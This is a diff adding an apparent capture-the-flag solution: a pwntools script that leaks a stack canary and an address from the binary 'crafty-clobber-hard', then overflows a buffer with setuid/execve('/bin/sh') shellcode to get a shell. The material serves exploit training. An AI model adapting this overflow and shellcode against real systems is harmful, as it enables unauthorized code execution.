@@ -18,4 +18,89 @@ mov rax, 0x3b
 syscall
 """)
 ```
-looking at the old code, we acknowledge that we wasted space for 'mov' instead 
+looking at the old code, we acknowledge that we wasted space for 'mov' instead of 'push' and 'pop'
+fixing that a bit and we can fit a neatly 0x28 bytes code that spawn a shell and letting us read the flag
+```
+#!/usr/bin/python3
+
+from pwn import *
+
+context.arch="amd64"
+context.os="linux"
+context.log_level="debug"
+
+def slog(name , addr):
+    return success(': '.join([name, hex(addr)]))
+# while True:
+
+#     try:
+#         p.sendline(b'id')
+#         p.recvuntil(b'uid=' , timeout=1.5)
+#         break
+#     except:
+#         pass
+p=process("../crafty-clobber-hard")
+
+payload=b"REPEAT" + b"A"*(0x39-0x6)
+p.recvuntil("Payload size: ")
+p.sendline(str(len(payload)).encode())
+p.recvuntil("bytes)!")
+p.send(payload)
+
+zz = p.recvuntil(b"Backdoor")
+dat=zz.split(b"You said: ",1)[1]
+dat=dat[len(payload):]
+canary=b"\x00"+dat[:7]
+
+payload=b"REPEAT" + b"A"*(0x38-0x6+0x8)
+p.recvuntil("Payload size: ")
+p.sendline(str(len(payload)).encode())
+p.recvuntil("bytes)!")
+p.send(payload)
+
+zz = p.recvuntil(b"Backdoor")
+dat=zz.split(b"You said: ",1)[1]
+dat=dat[len(payload):]
+temp=dat[:6]
+
+addr = u64(temp + b'\x00' * 2)
+
+# print(p64(addr))
+print(hex(addr))
+
+addr=addr-0x160
+
+# print(p64(addr))
+print(hex(addr))
+
+# pause()
+
+payload = asm("""
+xor rdi, rdi
+mov rax, 105
+syscall
+mov rdi, 0x68732f6e69622f
+push rdi
+push rsp
+pop rdi
+xor rsi, rsi
+xor rdx, rdx
+mov rax, 0x3b
+syscall
+""")
+
+print(hex(len(payload)))
+# payload+=b"\x00"
+payload = payload.ljust(0x28)
+# payload += bytes.fromhex("4FCDDBA66C61AFB1")
+payload += bytes.fromhex("b1af616ca6dbcd4f")
+payload = payload.ljust(0x38)
+payload += canary + b"\x20"*8 + p64(addr)
+p.recvuntil("Payload size: ")
+# pause()
+p.sendline(str(len(payload)).encode())
+p.recvuntil("bytes)!")
+p.send(payload)
+
+p.interactive()
+```
